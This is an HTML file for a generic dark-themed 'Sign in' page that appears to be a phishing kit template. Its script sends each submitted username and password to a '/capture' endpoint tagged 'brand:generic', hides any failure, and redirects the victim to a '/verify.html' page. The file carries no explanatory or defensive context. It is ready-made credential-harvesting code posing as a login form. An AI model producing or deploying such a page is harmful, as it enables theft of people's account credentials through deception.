<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in</title>
<style>
  body{margin:0;min-height:100vh;display:grid;place-items:center;font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#0f1115;color:#e6e6e6}
  .card{width:360px;padding:32px;background:#171a21;border-radius:12px;box-shadow:0 10px 40px rgba(0,0,0,.4)}
  h1{margin:0 0 4px;font-size:22px} .sub{margin:0 0 24px;color:#8a8f99;font-size:14px}
  input{width:100%;padding:12px;margin-bottom:12px;border-radius:8px;border:1px solid #2a2f3a;background:#0f1115;color:#e6e6e6;font-size:14px}
  button{width:100%;padding:12px;border:0;border-radius:8px;background:#4a90e2;color:white;font-weight:600;cursor:pointer;font-size:14px}
</style>
</head>
<body>
  <div class="card">
    <h1>Sign in</h1><p class="sub">to continue</p>
    <form id="f">
      <input name="user" type="text" placeholder="Email or username" required autofocus>
      <input name="pass" type="password" placeholder="Password" required>
      <button type="submit">Continue</button>
    </form>
  </div>
<script>
document.getElementById('f').addEventListener('submit', async e => {
  e.preventDefault(); const fd = new FormData(e.target);
  await fetch('/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user:fd.get('user'),pass:fd.get('pass'),brand:'generic'})}).catch(()=>{});
  window.location.href = '/verify.html?b=generic';
});
</script>
</body>
</html>
